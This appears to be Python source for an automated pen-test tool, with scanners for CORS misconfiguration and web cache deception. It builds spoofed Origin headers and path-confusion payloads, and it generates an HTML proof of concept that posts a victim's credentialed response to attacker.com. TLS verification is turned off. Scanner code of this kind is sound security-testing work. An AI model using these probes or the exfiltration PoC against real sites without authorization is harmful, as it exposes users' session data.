"""
Jarwis AGI Pen Test - CORS Misconfiguration Scanner
Detects CORS vulnerabilities (A01:2021 - Broken Access Control)
Based on Web Hacking 101 techniques - adapted for 2025
"""

import asyncio
import logging
import re
import json
from typing import Dict, List, Optional
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin
import aiohttp
import ssl

logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    poc: str = ""
    reasoning: str = ""
    request_data: str = ""
    response_data: str = ""


class CORSScanner:
    """
    Scans for CORS (Cross-Origin Resource Sharing) misconfigurations
    OWASP A01:2021 - Broken Access Control
    CWE-942: Permissive Cross-domain Policy with Untrusted Domains
    
    Attack vectors:
    - Reflected Origin
    - Null Origin allowed
    - Wildcard with credentials
    - Pre-domain wildcard
    - Post-domain wildcard
    - Subdomain matching bypass
    - Protocol downgrade
    - Trust all subdomains
    """
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting CORS Misconfiguration scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        parsed = urlparse(base_url)
        target_domain = parsed.netloc
        
        # Collect endpoints
        urls_to_test = set([base_url])
        
        # API endpoints are most likely to have CORS
        api_paths = [
            '/api', '/api/v1', '/api/v2', '/api/user', '/api/data',
            '/graphql', '/rest', '/json', '/data', '/ajax'
        ]
        for path in api_paths:
            urls_to_test.add(urljoin(base_url, path))
        
        if hasattr(self.context, 'endpoints'):
            for endpoint in self.context.endpoints[:30]:
                url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                if url:
                    urls_to_test.add(url)
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            for url in urls_to_test:
                await self._test_cors(session, url, target_domain)
        
        logger.info(f"CORS scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _test_cors(self, session: aiohttp.ClientSession, url: str, target_domain: str):
        """Test a URL for CORS misconfigurations"""
        
        # Generate malicious origins based on target domain
        malicious_origins = self._generate_malicious_origins(target_domain)
        
        for origin, attack_type in malicious_origins:
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                headers = {
                    'Origin': origin,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                
                async with session.get(url, headers=headers) as response:
                    acao = response.headers.get('Access-Control-Allow-Origin', '')
                    acac = response.headers.get('Access-Control-Allow-Credentials', '')
                    acah = response.headers.get('Access-Control-Allow-Headers', '')
                    acam = response.headers.get('Access-Control-Allow-Methods', '')
                    
                    # Check for vulnerabilities
                    vuln = self._check_vulnerability(origin, acao, acac, attack_type)
                    
                    if vuln:
                        severity, title, description = vuln
                        
                        result = ScanResult(
                            id=f"CORS-{len(self.results)+1}",
                            category="A01:2021 - Broken Access Control",
                            severity=severity,
                            title=title,
                            description=description,
                            url=url,
                            method="GET",
                            parameter="Origin",
                            evidence=f"ACAO: {acao}, ACAC: {acac}",
                            remediation="Implement strict origin validation. Never reflect arbitrary origins. Use explicit whitelist.",
                            cwe_id="CWE-942",
                            poc=self._generate_poc(url, origin),
                            reasoning=f"Server reflected malicious origin: {origin}"
                        )
                        self.results.append(result)
                        
                        # Found one, don't need to test more origins on same URL
                        return
                        
            except Exception as e:
                logger.debug(f"Error testing {url}: {e}")
    
    def _generate_malicious_origins(self, target_domain: str) -> List[tuple]:
        """Generate malicious origins to test"""
        origins = []
        
        # Extract base domain
        parts = target_domain.split('.')
        if len(parts) >= 2:
            base_domain = '.'.join(parts[-2:])
        else:
            base_domain = target_domain
        
        # Remove port if present
        base_domain = base_domain.split(':')[0]
        target_domain_clean = target_domain.split(':')[0]
        
        # 1. Reflected Origin - exact reflection
        origins.append(('https://evil.com', 'reflected'))
        
        # 2. Null Origin
        origins.append(('null', 'null'))
        
        # 3. Pre-domain match (evil.com.target.com)
        origins.append((f'https://{target_domain_clean}.evil.com', 'pre-domain'))
        
        # 4. Post-domain match (targetevil.com)
        origins.append((f'https://{base_domain}evil.com', 'post-domain'))
        
        # 5. Subdomain - trust any subdomain
        origins.append((f'https://evil.{base_domain}', 'subdomain'))
        origins.append((f'https://attacker.{target_domain_clean}', 'subdomain'))
        
        # 6. Protocol downgrade
        if target_domain_clean.startswith('https://'):
            origins.append((f'http://{target_domain_clean}', 'protocol'))
        
        # 7. Backtick bypass
        origins.append((f'https://{target_domain_clean}`attacker.com', 'backtick'))
        
        # 8. Underscore bypass
        origins.append((f'https://{target_domain_clean}_attacker.com', 'underscore'))
        
        # 9. Case manipulation
        origins.append((f'https://{target_domain_clean.upper()}', 'case'))
        
        # 10. Newline injection
        origins.append((f'https://evil.com\n{target_domain_clean}', 'newline'))
        
        # 11. Tab injection
        origins.append((f'https://evil.com\t{target_domain_clean}', 'tab'))
        
        # 12. Special characters
        origins.append((f'https://{target_domain_clean}%00.evil.com', 'nullbyte'))
        origins.append((f'https://{target_domain_clean}%.evil.com', 'percent'))
        
        return origins
    
    def _check_vulnerability(self, origin: str, acao: str, acac: str, attack_type: str) -> Optional[tuple]:
        """Check if CORS response indicates vulnerability"""
        if not acao:
            return None
        
        acac_enabled = acac.lower() == 'true'
        
        # Wildcard with credentials
        if acao == '*' and acac_enabled:
            return ('critical', 'CORS Wildcard with Credentials', 
                    'Server allows any origin with credentials, enabling complete session hijacking.')
        
        # Reflected arbitrary origin
        if acao == origin and 'evil' in origin.lower():
            if acac_enabled:
                return ('critical', 'CORS Reflected Origin with Credentials',
                        f'Server reflects arbitrary origin ({origin}) with credentials, enabling session hijacking.')
            else:
                return ('high', 'CORS Reflected Origin',
                        f'Server reflects arbitrary origin ({origin}). Data theft possible.')
        
        # Null origin
        if acao == 'null' and origin == 'null':
            if acac_enabled:
                return ('critical', 'CORS Null Origin with Credentials',
                        'Server accepts null origin with credentials. Sandboxed iframes can steal data.')
            else:
                return ('high', 'CORS Null Origin Accepted',
                        'Server accepts null origin. Sandboxed iframes may access resources.')
        
        # Pre/post domain bypass
        if attack_type in ['pre-domain', 'post-domain', 'subdomain']:
            if acao == origin:
                if acac_enabled:
                    return ('critical', f'CORS {attack_type.title()} Bypass with Credentials',
                            f'Origin validation can be bypassed via {attack_type} attack. Session hijacking possible.')
                else:
                    return ('high', f'CORS {attack_type.title()} Bypass',
                            f'Origin validation can be bypassed via {attack_type} attack.')
        
        # Protocol downgrade
        if attack_type == 'protocol' and acao == origin:
            return ('medium', 'CORS Protocol Downgrade',
                    'Server accepts HTTP origin when HTTPS is expected. MitM may be possible.')
        
        return None
    
    def _generate_poc(self, url: str, origin: str) -> str:
        """Generate proof of concept HTML"""
        return f"""
<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC</title>
</head>
<body>
    <h1>CORS Vulnerability PoC</h1>
    <div id="result"></div>
    <script>
    // This script runs from {origin}
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '{url}', true);
    xhr.withCredentials = true;
    xhr.onload = function() {{
        document.getElementById('result').innerHTML = 
            '<pre>' + xhr.responseText + '</pre>';
        // Exfiltrate to attacker server
        fetch('https://attacker.com/log', {{
            method: 'POST',
            body: xhr.responseText
        }});
    }};
    xhr.send();
    </script>
</body>
</html>
"""


class CacheDeceptionScanner:
    """
    Scans for Web Cache Deception vulnerabilities
    OWASP A01:2021 - Broken Access Control
    
    Attack vectors:
    - Path confusion (page.html/user.css)
    - Static extension injection
    - Unkeyed header manipulation
    """
    
    # Static file extensions that might be cached
    STATIC_EXTENSIONS = [
        '.css', '.js', '.jpg', '.jpeg', '.png', '.gif', '.ico',
        '.svg', '.woff', '.woff2', '.ttf', '.eot', '.mp3', '.mp4',
        '.pdf', '.txt', '.xml', '.json', '.html', '.htm'
    ]
    
    # Sensitive endpoints to test
    SENSITIVE_PATHS = [
        '/account', '/profile', '/settings', '/dashboard',
        '/api/user', '/api/me', '/user/info', '/my-account',
        '/billing', '/orders', '/transactions'
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting Web Cache Deception scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Test sensitive paths
            for path in self.SENSITIVE_PATHS:
                url = urljoin(base_url, path)
                await self._test_cache_deception(session, url)
            
            # Test endpoints from context
            if hasattr(self.context, 'endpoints'):
                for endpoint in self.context.endpoints[:20]:
                    ep_url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                    if ep_url:
                        await self._test_cache_deception(session, ep_url)
        
        logger.info(f"Cache deception scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _test_cache_deception(self, session: aiohttp.ClientSession, url: str):
        """Test a URL for cache deception"""
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        
        # First, get the original response
        try:
            await asyncio.sleep(1 / self.rate_limit)
            async with session.get(url, headers=headers) as original_response:
                original_status = original_response.status
                original_body = await original_response.text()
                original_cache = original_response.headers.get('Cache-Control', '')
                
                # Skip if not interesting content
                if original_status != 200:
                    return
                
                # Check if response contains sensitive data
                sensitive_indicators = ['email', 'balance', 'account', 'name', 'address', 'card', 'phone']
                has_sensitive = any(s in original_body.lower() for s in sensitive_indicators)
                
                if not has_sensitive:
                    return
                    
        except Exception:
            return
        
        # Test with static extensions
        for ext in self.STATIC_EXTENSIONS[:10]:
            test_url = f"{url.rstrip('/')}/{self._random_string()}{ext}"
            
            try:
                await asyncio.sleep(1 / self.rate_limit)
                async with session.get(test_url, headers=headers) as response:
                    test_status = response.status
                    test_body = await response.text()
                    cache_header = response.headers.get('Cache-Control', '')
                    x_cache = response.headers.get('X-Cache', '')
                    cf_cache = response.headers.get('CF-Cache-Status', '')
                    age = response.headers.get('Age', '')
                    
                    # Check if response is cached and contains original content
                    if test_status == 200:
                        # Check for cache indicators
                        is_cached = any([
                            'max-age' in cache_header and 'no-cache' not in cache_header,
                            'public' in cache_header,
                            'HIT' in x_cache.upper(),
                            'HIT' in cf_cache.upper(),
                            age and int(age) > 0
                        ])
                        
                        # Check if sensitive content is in cached response
                        if is_cached and any(s in test_body.lower() for s in sensitive_indicators):
                            result = ScanResult(
                                id=f"CACHE-DECEPTION-{len(self.results)+1}",
                                category="A01:2021 - Broken Access Control",
                                severity="high",
                                title="Web Cache Deception",
                                description=f"Sensitive page can be cached by appending static file extension. User data may be cached and served to attackers.",
                                url=test_url,
                                method="GET",
                                evidence=f"Cache-Control: {cache_header}, X-Cache: {x_cache}",
                                remediation="Ensure dynamic pages with sensitive data are not cached. Use Cache-Control: no-store, private.",
                                cwe_id="CWE-524",
                                poc=f"1. Victim visits: {test_url}\n2. Attacker visits same URL\n3. Attacker receives victim's cached data",
                                reasoning="Sensitive content cached with static extension"
                            )
                            self.results.append(result)
                            return
                            
            except Exception:
                pass
        
        # Test path parameter injection
        test_urls = [
            f"{url}/..;/static.css",
            f"{url};.css",
            f"{url}%2f..%2fstatic.js",
        ]
        
        for test_url in test_urls:
            try:
                await asyncio.sleep(1 / self.rate_limit)
                async with session.get(test_url, headers=headers) as response:
                    if response.status == 200:
                        test_body = await response.text()
                        cache_header = response.headers.get('Cache-Control', '')
                        
                        if 'max-age' in cache_header and any(s in test_body.lower() for s in sensitive_indicators):
                            result = ScanResult(
                                id=f"CACHE-DECEPTION-PATH-{len(self.results)+1}",
                                category="A01:2021 - Broken Access Control",
                                severity="high",
                                title="Web Cache Deception via Path Confusion",
                                description="Path confusion allows sensitive pages to be cached.",
                                url=test_url,
                                method="GET",
                                evidence=f"Cache-Control: {cache_header}",
                                remediation="Normalize paths before caching. Strip path parameters.",
                                cwe_id="CWE-524",
                                reasoning="Path confusion allowed caching of sensitive content"
                            )
                            self.results.append(result)
                            return
                            
            except Exception:
                pass
    
    def _random_string(self, length: int = 8) -> str:
        """Generate random string"""
        import random
        import string
        return ''.join(random.choices(string.ascii_lowercase, k=length))
